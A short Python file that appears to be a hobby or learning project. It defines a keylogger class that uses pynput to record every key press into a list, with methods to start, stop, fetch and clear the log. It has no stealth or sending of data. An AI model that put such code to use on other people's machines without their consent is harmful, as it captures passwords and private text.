#from abc import ABC
#from typing import list
from pynput import keyboard

class Ikeylogger:
    def __init__(self):
        self.Listener=keyboard.Listener(on_press=self._data_logger)
        self.data=[]




    def _data_logger(self,key):
        self.data.append(key)

    def start_logging(self):
        self.Listener.start()

    def stop_logging(self):
        self.Listener.stop()

    def get_logged_keys(self):
        return  self.data

    def Reset_information(self):
        self.data.clear()



    def data_printer(data):
        return(data)




